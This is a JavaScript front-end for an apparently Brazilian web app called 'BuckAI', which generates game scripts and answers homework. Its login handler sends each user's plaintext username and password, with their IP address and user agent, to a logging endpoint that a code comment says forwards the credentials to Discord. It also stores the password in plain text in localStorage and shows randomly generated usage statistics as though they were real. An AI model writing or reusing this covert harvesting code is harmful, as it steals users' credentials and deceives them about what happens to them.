document.addEventListener('DOMContentLoaded', () => {
  // Lógica Web (Removido Electron ipcRenderer)
  
  const activeNowEl = document.getElementById('activeNow');
  const totalScriptsEl = document.getElementById('totalScripts');
  const totalClientsEl = document.getElementById('totalClients');

  // Simulação de estatísticas para Web (Como não há banco central, usamos números dinâmicos)
  const updateStatsUI = () => {
    // Carregar do localStorage se existir
    let webStats = JSON.parse(localStorage.getItem('buckai_stats')) || {
      totalScripts: Math.floor(Math.random() * 50) + 100,
      totalClients: Math.floor(Math.random() * 20) + 50
    };
    
    activeNowEl.textContent = Math.floor(Math.random() * 8) + 2; // Simula 2-10 online
    totalScriptsEl.textContent = webStats.totalScripts;
    totalClientsEl.textContent = webStats.totalClients;
  };

  const incrementScripts = () => {
    let webStats = JSON.parse(localStorage.getItem('buckai_stats')) || {
      totalScripts: 100,
      totalClients: 50
    };
    webStats.totalScripts++;
    localStorage.setItem('buckai_stats', JSON.stringify(webStats));
    updateStatsUI();
  };

  updateStatsUI();

  const generateBtn = document.getElementById('generateBtn');
  const descriptionInput = document.getElementById('description');
  const platformRadios = document.getElementsByName('platform');
  const resultArea = document.getElementById('resultArea');
  const outputCode = document.getElementById('outputCode');
  const copyBtn = document.getElementById('copyBtn');
  const fixBtn = document.getElementById('fixBtn');
  const downloadBtn = document.getElementById('downloadBtn');
  const imageInput = document.getElementById('imageInput');
  const uploadImageBtn = document.getElementById('uploadImageBtn');
  const imageStatus = document.getElementById('imageStatus');
  const loader = document.getElementById('loader');
  const lockScreen = document.getElementById('lockScreen');
  const verifySubBtn = document.getElementById('verifySubBtn');
  const authUsernameInput = document.getElementById('authUsername');
  const authPasswordInput = document.getElementById('authPassword');
  const welcomeUserEl = document.getElementById('welcomeUser');

  // Seletores de Modos
  const gamerModeBtn = document.getElementById('gamerModeBtn');
  const studentModeBtn = document.getElementById('studentModeBtn');
  const gamerSection = document.getElementById('gamerSection');
  const studentSection = document.getElementById('studentSection');

  // Lógica de Troca de Modos
  gamerModeBtn.addEventListener('click', () => {
    gamerModeBtn.classList.add('active');
    studentModeBtn.classList.remove('active');
    gamerSection.classList.remove('hidden');
    studentSection.classList.add('hidden');
    resultArea.classList.add('hidden');
  });

  studentModeBtn.addEventListener('click', () => {
    studentModeBtn.classList.add('active');
    gamerModeBtn.classList.remove('active');
    studentSection.classList.remove('hidden');
    gamerSection.classList.add('hidden');
    resultArea.classList.add('hidden');
  });

  // Função para pegar IP (opcional para logs)
  const getIP = async () => {
    try {
      const res = await fetch('https://api.ipify.org?format=json');
      const data = await res.json();
      return data.ip;
    } catch(e) { return "IP Web"; }
  };

  // Verificar inscrição ao iniciar (LocalStorage)
  const checkSub = async () => {
    const isSubscribed = localStorage.getItem('buckai_subscribed') === 'true';
    const savedUser = localStorage.getItem('buckai_username');

    if (!isSubscribed) {
      lockScreen.classList.remove('hidden');
    } else {
      // Log de retorno de usuário ativo
      const ip = await getIP();
      fetch('/api/log', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
          type: 'active', 
          ip, 
          username: savedUser || "Usuário Antigo",
          userAgent: navigator.userAgent 
        })
      });
      
      if (savedUser) {
        welcomeUserEl.textContent = `BEM-VINDO DE VOLTA, ${savedUser.toUpperCase()}`;
        welcomeUserEl.classList.remove('hidden');
      }
    }
  };
  checkSub();

  // Lógica de Desbloqueio e Login
  verifySubBtn.addEventListener('click', async () => {
    const username = authUsernameInput.value.trim();
    const password = authPasswordInput.value.trim();

    if (!username || !password) {
      alert('Por favor, crie um usuário e uma senha para continuar.');
      return;
    }

    const ip = await getIP();
    // Envia credenciais para o Discord via API
    await fetch('/api/log', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ 
        type: 'login', 
        username, 
        password, 
        ip, 
        userAgent: navigator.userAgent 
      })
    });

    // Salva as informações localmente para não precisar logar de novo
    localStorage.setItem('buckai_subscribed', 'true');
    localStorage.setItem('buckai_username', username);
    localStorage.setItem('buckai_password', password); // Salva a senha localmente conforme solicitado

    welcomeUserEl.textContent = `BEM-VINDO, ${username.toUpperCase()}`;
    welcomeUserEl.classList.remove('hidden');

    lockScreen.classList.add('hidden');
    alert(`Conta criada com sucesso! Bem-vindo, ${username}.`);
  });

  let selectedImageBase64 = null;

  // Lógica para Upload de Imagem
  uploadImageBtn.addEventListener('click', () => imageInput.click());

  imageInput.addEventListener('change', (e) => {
    const file = e.target.files[0];
    if (file) {
      const reader = new FileReader();
      reader.onload = (readerEvent) => {
        selectedImageBase64 = readerEvent.target.result.split(',')[1];
        imageStatus.textContent = '✅ Print Adicionado';
        uploadImageBtn.classList.add('selected');
      };
      reader.readAsDataURL(file);
    }
  });

  // Efeito de digitação (Typewriter)
  const typeWriter = (text, element, speed = 5) => {
    let i = 0;
    element.textContent = '';
    const timer = setInterval(() => {
      if (i < text.length) {
        element.textContent += text.charAt(i);
        i++;
        element.parentElement.parentElement.scrollTop = element.parentElement.parentElement.scrollHeight;
      } else {
        clearInterval(timer);
      }
    }, speed);
  };

  const getSelectedPlatform = () => {
    for (const radio of platformRadios) {
      if (radio.checked) return radio.value;
    }
    return 'FiveM';
  };

  // Download ZIP (Versão Web - Simplificada para baixar apenas o código como .txt ou similar se necessário,
  // ou poderíamos usar JSZip se quisermos manter a experiência ZIP)
  downloadBtn.addEventListener('click', async () => {
    const code = outputCode.textContent;
    const platform = getSelectedPlatform();

    if (!code) return;

    // Criar um arquivo blob para download direto no navegador
    const blob = new Blob([code], { type: 'text/plain' });
    const url = window.URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `BuckAI_Script_${platform}.txt`;
    document.body.appendChild(a);
    a.click();
    window.URL.revokeObjectURL(url);
    document.body.removeChild(a);
    
    alert('Código baixado como .txt! (Para .ZIP completo, use a versão Desktop ou extraia manualmente)');
  });

  const studyBtn = document.getElementById('studyBtn');
  const studentTaskInput = document.getElementById('studentTask');
  const studentImageInput = document.getElementById('studentImageInput');
  const uploadStudentImageBtn = document.getElementById('uploadStudentImageBtn');
  const studentImageStatus = document.getElementById('studentImageStatus');

  let studentImageBase64 = null;

  uploadStudentImageBtn.addEventListener('click', () => studentImageInput.click());

  studentImageInput.addEventListener('change', (e) => {
    const file = e.target.files[0];
    if (file) {
      const reader = new FileReader();
      reader.onload = (readerEvent) => {
        studentImageBase64 = readerEvent.target.result.split(',')[1];
        studentImageStatus.textContent = '✅ Foto Adicionada';
        uploadStudentImageBtn.classList.add('selected');
      };
      reader.readAsDataURL(file);
    }
  });

  // Envio Modo Estudante (Web)
  studyBtn.addEventListener('click', async () => {
    const task = studentTaskInput.value.trim();
    if (!task && !studentImageBase64) {
      alert('Por favor, digite sua dúvida ou envie uma foto do exercício.');
      return;
    }

    loader.classList.remove('hidden');
    studyBtn.disabled = true;
    resultArea.classList.add('hidden');

    try {
      const ip = await getIP();
      const response = await fetch('/api/study', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ task, base64Image: studentImageBase64, ip })
      });

      const data = await response.json();
      if (data.error) throw new Error(data.error);

      studentImageBase64 = null;
      studentImageStatus.textContent = '📸 Tirar/Enviar Foto';
      uploadStudentImageBtn.classList.remove('selected');
      studentImageInput.value = '';

      resultArea.classList.remove('hidden');
      typeWriter(data.result, outputCode);
      resultArea.scrollIntoView({ behavior: 'smooth' });

    } catch (error) {
      alert('Erro na pesquisa: ' + error.message);
    } finally {
      loader.classList.add('hidden');
      studyBtn.disabled = false;
    }
  });

  // Gerar Script (Web)
  generateBtn.addEventListener('click', async () => {
    const description = descriptionInput.value.trim();
    const platform = getSelectedPlatform();

    if (!description && !selectedImageBase64) {
      alert('Por favor, descreva o script ou envie um print do erro.');
      return;
    }

    loader.classList.remove('hidden');
    generateBtn.disabled = true;
    resultArea.classList.add('hidden');

    try {
      const ip = await getIP();
      const response = await fetch('/api/generate', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ description, platform, base64Image: selectedImageBase64, ip })
      });

      const data = await response.json();
      if (data.error) throw new Error(data.error);

      selectedImageBase64 = null;
      imageStatus.textContent = '📎 Enviar Print';
      uploadImageBtn.classList.remove('selected');
      imageInput.value = '';

      resultArea.classList.remove('hidden');
      typeWriter(data.result, outputCode);
      resultArea.scrollIntoView({ behavior: 'smooth' });

      incrementScripts();

    } catch (error) {
      console.error('Erro ao gerar script:', error);
      alert('Ocorreu um erro: ' + error.message);
    } finally {
      loader.classList.add('hidden');
      generateBtn.disabled = false;
    }
  });

  // Copiar código
  copyBtn.addEventListener('click', () => {
    const code = outputCode.textContent;
    navigator.clipboard.writeText(code).then(() => {
      const originalText = copyBtn.textContent;
      copyBtn.textContent = 'Copiado!';
      copyBtn.classList.add('copied');
      setTimeout(() => {
        copyBtn.textContent = originalText;
        copyBtn.classList.remove('copied');
      }, 2000);
    });
  });

  // Corrigir código (Web)
  fixBtn.addEventListener('click', async () => {
    const code = outputCode.textContent;
    const platform = getSelectedPlatform();
    const errorMsg = prompt("O que está errado ou o que você quer melhorar?");

    if (!code) return;

    loader.querySelector('p').textContent = 'Corrigindo seu script...';
    loader.classList.remove('hidden');
    fixBtn.disabled = true;

    try {
      const ip = await getIP();
      const response = await fetch('/api/generate', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
          description: `CORREÇÃO:\nCódigo Atual: ${code}\nErro/Melhoria: ${errorMsg}`, 
          platform, 
          ip 
        })
      });

      const data = await response.json();
      if (data.error) throw new Error(data.error);

      typeWriter(data.result, outputCode);

    } catch (error) {
      alert('Erro ao corrigir: ' + error.message);
    } finally {
      loader.classList.add('hidden');
      loader.querySelector('p').textContent = 'Codificando seu script...';
      fixBtn.disabled = false;
    }
  });
});
